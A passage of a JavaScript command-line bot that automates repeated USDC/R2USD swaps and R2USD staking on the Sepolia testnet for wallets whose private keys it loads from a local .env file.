          for (let i = 1; i <= parsedNumTxs; i++) {
            console.log(`${EMOJI.LOADING} ${colorText(`Executing USDC to R2USD swap transaction ${i} of ${parsedNumTxs} (Amount: ${parsedAmount} USDC)`, COLORS.YELLOW)}`);
            const success = await swapUSDCtoR2USD(wallet, parsedAmount);
            if (success) {
              console.log(`${EMOJI.SUCCESS} ${colorText(`Swap transaction ${i} completed successfully!`, COLORS.GREEN)}`);
            } else {
              console.error(`${EMOJI.ERROR} ${colorText(`Swap transaction ${i} failed. Continuing to next transaction.`, COLORS.RED)}`);
            }
          }
          console.log(`${EMOJI.SUCCESS} ${colorText(`Completed ${parsedNumTxs} USDC to R2USD swap transaction(s) for wallet ${wallet.address}.`, COLORS.GREEN)}`);
        }
        await showMenu(wallets);
      });
    });
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('An error occurred during USDC to R2USD swap process:', COLORS.RED)}`, error);
    await showMenu(wallets);
  }
}

async function handleR2USDtoUSDCSwap(wallets) {
  try {
    const selectedWallets = await selectWallet(wallets);
    const isAllWallets = Array.isArray(selectedWallets);
    const walletList = isAllWallets ? selectedWallets : [selectedWallets];
    
    for (const wallet of walletList) {
      const r2usdBalance = await checkBalance(wallet, R2USD_ADDRESS);
      console.log(`\n${EMOJI.MONEY} ${colorText(`Wallet ${wallet.address} - Current R2USD balance: ${r2usdBalance}`, COLORS.WHITE)}`);
    }
    
    rl.question(`${colorText('Enter amount of R2USD to swap (or "back" to return to menu): ', COLORS.WHITE)}`, async (amount) => {
      if (amount.toLowerCase() === 'back') {
        await showMenu(wallets);
        return;
      }
      const parsedAmount = parseFloat(amount);
      if (isNaN(parsedAmount) || parsedAmount <= 0) {
        console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Please enter a positive number.', COLORS.RED)}`);
        await handleR2USDtoUSDCSwap(wallets);
        return;
      }
      rl.question(`${colorText('Enter number of swap transactions to perform per wallet (or "skip" to return to menu): ', COLORS.WHITE)}`, async (numTxs) => {
        if (numTxs.toLowerCase() === 'skip') {
          await showMenu(wallets);
          return;
        }
        const parsedNumTxs = parseInt(numTxs);
        if (isNaN(parsedNumTxs) || parsedNumTxs <= 0) {
          console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Please enter a positive integer.', COLORS.RED)}`);
          await handleR2USDtoUSDCSwap(wallets);
          return;
        }
        for (const wallet of walletList) {
          console.log(`\n${colorText(`Processing wallet: ${wallet.address}`, COLORS.WHITE)}`);
          for (let i = 1; i <= parsedNumTxs; i++) {
            console.log(`${EMOJI.LOADING} ${colorText(`Executing R2USD to USDC swap transaction ${i} of ${parsedNumTxs} (Amount: ${parsedAmount} R2USD)`, COLORS.YELLOW)}`);
            const success = await swapR2USDtoUSDC(wallet, parsedAmount);
            if (success) {
              console.log(`${EMOJI.SUCCESS} ${colorText(`Swap transaction ${i} completed successfully!`, COLORS.GREEN)}`);
            } else {
              console.error(`${EMOJI.ERROR} ${colorText(`Swap transaction ${i} failed. Continuing to next transaction.`, COLORS.RED)}`);
            }
          }
          console.log(`${EMOJI.SUCCESS} ${colorText(`Completed ${parsedNumTxs} R2USD to USDC swap transaction(s) for wallet ${wallet.address}.`, COLORS.GREEN)}`);
        }
        await showMenu(wallets);
      });
    });
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('An error occurred during R2USD to USDC swap process:', COLORS.RED)}`, error);
    await showMenu(wallets);
  }
}

async function handleStakeR2USD(wallets) {
  try {
    const selectedWallets = await selectWallet(wallets);
    const isAllWallets = Array.isArray(selectedWallets);
    const walletList = isAllWallets ? selectedWallets : [selectedWallets];
    
    for (const wallet of walletList) {
      const r2usdBalance = await checkBalance(wallet, R2USD_ADDRESS);
      console.log(`\n${EMOJI.MONEY} ${colorText(`Wallet ${wallet.address} - Current R2USD balance: ${r2usdBalance}`, COLORS.WHITE)}`);
    }
    
    rl.question(`${colorText('Enter amount of R2USD to stake (or "back" to return to menu): ', COLORS.WHITE)}`, async (amount) => {
      if (amount.toLowerCase() === 'back') {
        await showMenu(wallets);
        return;
      }
      const parsedAmount = parseFloat(amount);
      if (isNaN(parsedAmount) || parsedAmount <= 0) {
        console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Please enter a positive number.', COLORS.RED)}`);
        await handleStakeR2USD(wallets);
        return;
      }
      rl.question(`${colorText('Enter number of staking transactions to perform per wallet (or "skip" to return to menu): ', COLORS.WHITE)}`, async (numTxs) => {
        if (numTxs.toLowerCase() === 'skip') {
          await showMenu(wallets);
          return;
        }
        const parsedNumTxs = parseInt(numTxs);
        if (isNaN(parsedNumTxs) || parsedNumTxs <= 0) {
          console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Please enter a positive integer.', COLORS.RED)}`);
          await handleStakeR2USD(wallets);
          return;
        }
        for (const wallet of walletList) {
          console.log(`\n${colorText(`Processing wallet: ${wallet.address}`, COLORS.WHITE)}`);
          for (let i = 1; i <= parsedNumTxs; i++) {
            console.log(`${EMOJI.LOADING} ${colorText(`Executing staking transaction ${i} of ${parsedNumTxs} (Amount: ${parsedAmount} R2USD)`, COLORS.YELLOW)}`);
            const success = await stakeR2USD(wallet, parsedAmount);
            if (success) {
              console.log(`${EMOJI.SUCCESS} ${colorText(`Staking transaction ${i} completed successfully!`, COLORS.GREEN)}`);
            } else {
              console.error(`${EMOJI.ERROR} ${colorText(`Staking transaction ${i} failed. Continuing to next transaction.`, COLORS.RED)}`);
            }
          }
          console.log(`${EMOJI.SUCCESS} ${colorText(`Completed ${parsedNumTxs} staking transaction(s) for wallet ${wallet.address}.`, COLORS.GREEN)}`);
        }
        await showMenu(wallets);
      });
    });
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('An error occurred during R2USD staking process:', COLORS.RED)}`, error);
    await showMenu(wallets);
  }
}

async function main() {
  try {
    console.log('\n----------------------------------------');
    console.log(`${colorText('    R2 Money Bot	 ', COLORS.CYAN)}`);
    console.log('----------------------------------------');
    
    console.log(`${EMOJI.INFO} ${colorText(`Loaded ${proxies.length} proxies from proxies.txt`, COLORS.GREEN)}`);
    console.log(`${EMOJI.INFO} ${colorText(`Loaded ${privateKeys.length} private keys from .env`, COLORS.GREEN)}`);
    
    console.log(`${EMOJI.INFO} ${colorText('USDC/R2USD/sR2USD Bot Starting on Sepolia Testnet...', COLORS.GREEN)}`);
    const wallets = [];
    for (const privateKey of privateKeys) {
      try {
        const result = await initializeWallet(privateKey);
        wallets.push(result.wallet);
      } catch (error) {
      }
    }
    if (wallets.length === 0) {
      console.error(`${EMOJI.ERROR} ${colorText('No valid wallets initialized. Exiting.', COLORS.RED)}`);
      process.exit(1);
    }
    await showMenu(wallets);
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('An error occurred:', COLORS.RED)}`, error);
    rl.close();
  }
}

rl.on('close', () => {
  console.log(`${EMOJI.INFO} ${colorText('Application exited.', COLORS.GRAY)}`);
  process.exit(0);
});

main();
